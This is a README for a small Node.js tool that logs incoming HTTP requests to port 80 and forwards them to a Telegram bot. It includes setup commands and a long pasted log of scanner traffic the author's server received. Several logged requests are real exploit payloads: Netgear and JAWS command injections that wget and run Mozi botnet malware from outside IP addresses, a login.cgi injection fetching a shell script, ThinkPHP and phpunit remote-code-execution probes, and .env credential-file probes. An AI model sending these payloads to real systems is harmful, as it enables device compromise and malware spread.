# Local-Network Sniffer

A tiny node js-based program to listen on 80 port and will log all requests and also send logs to Telegram Bot.

## Getting Start

- Create a Telegram bot
- Put telegram bot' Token to `app.js` file
- Start app.js directly or via `pm2 start app.js`

## Purpose

If you want to sniff a special domain at your server, You can setup following script at another VPS and proxy your target domain to next **SERVER IP**.
Just: `nano /etc/hosts`


### My Commands

```
curl -sL https://rpm.nodesource.com/setup_10.x | sudo bash -
sudo yum install nodejs
cd ~/
git clone https://github.com/BaseMax/LocalNetworkSniffer
cd LocalNetworkSniffer
npm install express --save
yum install nano
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8000
sudo sh -c "iptables-save > /etc/iptables.rules"
npm i -g pm2
pm2 start app.js
yum install wget curl
wget -O - http://127.0.0.1/
ls
firewall-cmd --zone=public --add-port=80/tcp --permanent
firewall-cmd --reload
npm install --save node-telegram-bot-api
pm2 log
pm2 list
pm2 restart 0
pm2 log
pm2 list
pm2 stop 0
npm i json-stringify-safe
pm2 restart 0
pm2 log
```

### Funny

It's very funny, bots are sending many fake requests to find BUG/Virus in websites.
And it's going and growing daily, While ip of server is not published anywhere and bots and sending and sending...

```
http://undefined/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://178.175.3.180:53147/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
http://SERVER_IP/
http://SERVER_IP:80/
http://SERVER_IP/
http://SERVER_IP/
http://SERVER_IP:80/
http://SERVER_IP/phpMyAdmin/scripts/setup.php
http://SERVER_IP/phpmyadmin/scripts/setup.php
http://SERVER_IP/pma/scripts/setup.php
http://SERVER_IP/myadmin/scripts/setup.php
http://SERVER_IP/MyAdmin/scripts/setup.php
http://SERVER_IP/w00tw00t.at.blackhats.romanian.anti-sec:)
http://SERVER_IP/phpMyAdmin/scripts/setup.php
http://SERVER_IP/phpmyadmin/scripts/setup.php
http://SERVER_IP/pma/scripts/setup.php
http://SERVER_IP/myadmin/scripts/setup.php
http://SERVER_IP:80/config/getuser?index=0
http://SERVER_IP/myadmin/scripts/setup.php
http://undefined/boaform/admin/formLogin?username=ec8&psd=ec8
http://undefined/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://95.32.156.217:40734/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
http://SERVER_IP:80/
http://SERVER_IP/
http://undefined/
http://SERVER_IP:80/solr/admin/info/system?wt=json
http://SERVER_IP:80/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
http://SERVER_IP:80/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21
http://SERVER_IP:80/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
http://SERVER_IP:80/wp-content/plugins/wp-file-manager/readme.txt
http://SERVER_IP:80/?XDEBUG_SESSION_START=phpstorm
http://SERVER_IP:80/console/
http://SERVER_IP:80/_ignition/execute-solution
http://SERVER_IP/_ignition/execute-solution
http://SERVER_IP/w00tw00t.at.blackhats.romanian.anti-sec:)
http://SERVER_IP/phpMyAdmin/scripts/setup.php
http://SERVER_IP/pma/scripts/setup.php
http://SERVER_IP/MyAdmin/scripts/setup.php
http://SERVER_IP:80/config/getuser?index=0
http://SERVER_IP:80/
http://SERVER_IP/
http://continewsnv5otx5kaoje7krkto2qbu3gtqef22mnr7eaxw3y6ncz3ad.onion/
http://SERVER_IP:80/config/getuser?index=0
http://SERVER_IP:80/
http://SERVER_IP/
http://SERVER_IP:80/
http://undefined/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
http://SERVER_IP/.env
http://SERVER_IP:80/
http://SERVER_IP/.env
http://SERVER_IP:80/
http://SERVER_IP/c/
http://SERVER_IP:80/
http://SERVER_IP/
http://SERVER_IP/index.php
http://undefined/
http://undefined/
http://SERVER_IP:80/
http://SERVER_IP:80/
http://undefined/
http://SERVER_IP:80/
http://SERVER_IP:80/wp-login.php
http://SERVER_IP:80/
http://SERVER_IP/
http://SERVER_IP/
http://SERVER_IP:80/config/getuser?index=0
http://SERVER_IP/TP/public/index.php
http://SERVER_IP/TP/public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
http://SERVER_IP:80/
http://SERVER_IP:80/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
http://SERVER_IP:80/solr/admin/info/system?wt=json
http://SERVER_IP:80/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21
http://SERVER_IP:80/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
http://SERVER_IP:80/?XDEBUG_SESSION_START=phpstorm
http://SERVER_IP:80/wp-content/plugins/wp-file-manager/readme.txt
http://SERVER_IP:80/console/
http://SERVER_IP:80/_ignition/execute-solution
http://SERVER_IP/
http://SERVER_IP:80/
http://SERVER_IP:80/config/getuser?index=0
http://SERVER_IP/
http://SERVER_IP/
http://SERVER_IP/wp-includes/wlwmanifest.xml
http://SERVER_IP/xmlrpc.php?rsd
http://SERVER_IP/
http://SERVER_IP/blog/wp-includes/wlwmanifest.xml
http://SERVER_IP/web/wp-includes/wlwmanifest.xml
http://SERVER_IP/wordpress/wp-includes/wlwmanifest.xml
http://SERVER_IP/website/wp-includes/wlwmanifest.xml
http://SERVER_IP/wp/wp-includes/wlwmanifest.xml
http://SERVER_IP/news/wp-includes/wlwmanifest.xml
http://SERVER_IP/2018/wp-includes/wlwmanifest.xml
http://SERVER_IP/2019/wp-includes/wlwmanifest.xml
http://SERVER_IP/shop/wp-includes/wlwmanifest.xml
http://SERVER_IP/wp1/wp-includes/wlwmanifest.xml
http://SERVER_IP/test/wp-includes/wlwmanifest.xml
http://SERVER_IP/media/wp-includes/wlwmanifest.xml
http://SERVER_IP/wp2/wp-includes/wlwmanifest.xml
http://SERVER_IP/site/wp-includes/wlwmanifest.xml
http://SERVER_IP/cms/wp-includes/wlwmanifest.xml
http://SERVER_IP/sito/wp-includes/wlwmanifest.xml
http://SERVER_IP/.env
http://SERVER_IP:80/
http://SERVER_IP/
http://SERVER_IP/
http://SERVER_IP:80/
http://SERVER_IP/
http://SERVER_IP/.env
http://SERVER_IP/
http://undefined/boaform/admin/formLogin?username=adminisp&psd=adminisp
http://SERVER_IP:80/login
http://SERVER_IP:80/jenkins/login
http://SERVER_IP:80/manager/html
http://SERVER_IP:80/wp-login.php
http://SERVER_IP:80/?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=__HelloThinkPHP
http://SERVER_IP:80/
http://SERVER_IP/.env
http://SERVER_IP/.env
http://undefined/w00tw00t.at.ISC.SANS.DFind:)
http://undefined/
http://SERVER_IP:80/
http://SERVER_IP/
http://SERVER_IP/.env
http://SERVER_IP:80/
http://SERVER_IP:80/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
http://SERVER_IP:80/solr/admin/info/system?wt=json
http://SERVER_IP:80/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21
http://SERVER_IP:80/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
http://SERVER_IP:80/?XDEBUG_SESSION_START=phpstorm
http://SERVER_IP:80/wp-content/plugins/wp-file-manager/readme.txt
http://SERVER_IP:80/console/
http://SERVER_IP:80/_ignition/execute-solution
http://SERVER_IP/.env
http://SERVER_IP:80/config/getuser?index=0
http://SERVER_IP:80/
http://SERVER_IP/.env
http://SERVER_IP/
http://SERVER_IP:80/
http://SERVER_IP:80/
http://SERVER_IP/.env
http://SERVER_IP:80/
http://SERVER_IP/.env
http://SERVER_IP:80/
http://SERVER_IP:80/
http://SERVER_IP/.env
http://undefined/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://120.85.238.117:52120/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
http://SERVER_IP/manager/html
http://SERVER_IP/
http://SERVER_IP:80/
http://SERVER_IP:80/
http://SERVER_IP:80/
http://SERVER_IP:80/favicon.ico
http://undefined/0bef
http://SERVER_IP:80/
http://SERVER_IP/
http://SERVER_IP/status
http://SERVER_IP/stat
http://SERVER_IP/.env
http://SERVER_IP:80/solr/admin/info/system?wt=json
http://SERVER_IP:80/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21
http://SERVER_IP:80/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
http://SERVER_IP:80/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
http://SERVER_IP:80/?XDEBUG_SESSION_START=phpstorm
http://SERVER_IP:80/wp-content/plugins/wp-file-manager/readme.txt
http://SERVER_IP:80/_ignition/execute-solution
http://SERVER_IP:80/console/
http://SERVER_IP/
http://SERVER_IP/
http://undefined/
http://SERVER_IP/
http://undefined/w00tw00t.at.ISC.SANS.DFind:)
http://SERVER_IP:80/
http://SERVER_IP:80/
http://SERVER_IP/
http://SERVER_IP/
http://SERVER_IP:80/
http://SERVER_IP:80/login
http://SERVER_IP:80/manager/html
http://SERVER_IP:80/jenkins/login
http://SERVER_IP:80/wp-login.php
http://SERVER_IP:80/?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=__HelloThinkPHP
http://SERVER_IP:80/shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
http://undefined/robots.txt
http://SERVER_IP/
http://SERVER_IP/.env
http://5.188.210.227http://5.188.210.227/echo.php
http://SERVER_IP:80/
http://SERVER_IP:80/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
http://SERVER_IP:80/solr/admin/info/system?wt=json
http://SERVER_IP:80/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21
http://SERVER_IP:80/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
http://SERVER_IP:80/?XDEBUG_SESSION_START=phpstorm
http://SERVER_IP:80/wp-content/plugins/wp-file-manager/readme.txt
http://SERVER_IP:80/console/
http://SERVER_IP:80/_ignition/execute-solution
http://SERVER_IP/.env
http://SERVER_IP:80/config/getuser?index=0
http://SERVER_IP/
http://SERVER_IP:80/
http://undefined/
http://undefined/
http://SERVER_IP:80/
http://SERVER_IP/favicon.ico
http://SERVER_IP/favicon.ico
http://SERVER_IP/favicon.ico
http://SERVER_IP/favicon.ico
http://SERVER_IP/favicon.ico
http://SERVER_IP/favicon.ico
http://SERVER_IP/favicon.ico
http://undefined/0bef
http://SERVER_IP/verify/
http://SERVER_IP/favicon.ico
http://SERVER_IP/favicon.ico
http://SERVER_IP/favicon.ico
http://SERVER_IP/favicon.ico
http://SERVER_IP/favicon.ico
http://SERVER_IP/favicon.ico
http://SERVER_IP/favicon.ico
http://SERVER_IP/.env
http://SERVER_IP:80/
http://SERVER_IP:80/
http://SERVER_IP:80/favicon.ico
http://SERVER_IP/favicon.ico
http://SERVER_IP/favicon.ico
http://SERVER_IP:80/_ignition/execute-solution
http://SERVER_IP:80/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
http://SERVER_IP:80/?XDEBUG_SESSION_START=phpstorm
http://SERVER_IP:80/console/
http://SERVER_IP:80/wp-content/plugins/wp-file-manager/readme.txt
http://SERVER_IP:80/
http://undefined/
http://undefined/login.cgi?cli=aa%20aa%27;wget%20http://45.133.1.173/sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$
http://SERVER_IP/
http://SERVER_IP/.env
http://SERVER_IP/
http://SERVER_IP:80/
http://SERVER_IP/.env
http://SERVER_IP:80/
http://undefined/0bef
http://SERVER_IP/.env
http://SERVER_IP:80/
http://SERVER_IP:80/
http://SERVER_IP/
http://SERVER_IP/.env
http://SERVER_IP/.env
http://SERVER_IP/favicon.ico
http://SERVER_IP:80/invoker/readonly
http://SERVER_IP:80/
http://SERVER_IP:80/login
http://SERVER_IP:80/jenkins/login
http://SERVER_IP:80/manager/html
http://SERVER_IP:80/wp-login.php
http://SERVER_IP:80/?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=wGHGx0gw
http://SERVER_IP/.env
http://undefined/robots.txt
http://SERVER_IP:80/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
http://SERVER_IP:80/solr/admin/info/system?wt=json
http://SERVER_IP:80/?XDEBUG_SESSION_START=phpstorm
http://SERVER_IP:80/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21
http://SERVER_IP:80/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
http://SERVER_IP:80/console/
http://SERVER_IP:80/wp-content/plugins/wp-file-manager/readme.txt
http://SERVER_IP:80/_ignition/execute-solution
http://SERVER_IP:80/
http://SERVER_IP/.env
http://SERVER_IP:80/config/getuser?index=0
http://SERVER_IP:80/
http://SERVER_IP/
http://SERVER_IP/
http://SERVER_IP:80/
http://SERVER_IP/
http://SERVER_IP/
http://static.SERVER_IP.clients.your-server.de/
http://static.SERVER_IP.clients.your-server.de/
http://static.SERVER_IP.clients.your-server.de/
http://SERVER_IP/
http://SERVER_IP:80/
http://SERVER_IP/
http://SERVER_IP/.env
http://SERVER_IP/
http://SERVER_IP/.env
http://SERVER_IP:80/
http://undefined/
http://SERVER_IP/
http://undefined/w00tw00t.at.ISC.SANS.DFind:)
http://undefined/w00tw00t.at.ISC.SANS.DFind:)
http://SERVER_IP:80/config/getuser?index=0
http://SERVER_IP/
http://SERVER_IP/
http://SERVER_IP/favicon.ico
http://undefined/0bef
http://SERVER_IP:80/
http://SERVER_IP:80/
http://SERVER_IP:80/
http://SERVER_IP/.env
http://SERVER_IP/.env
http://SERVER_IP/
http://SERVER_IP:80/
http://SERVER_IP:80/
http://undefined/
http://SERVER_IP:80/shell?cd+/tmp;rm+-rf+*;wget+http://163.142.123.137:34204/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
http://SERVER_IP/.env
```

### TODO

- Adding/support HTTPS-SSL

© Copyright 2021, Max Base
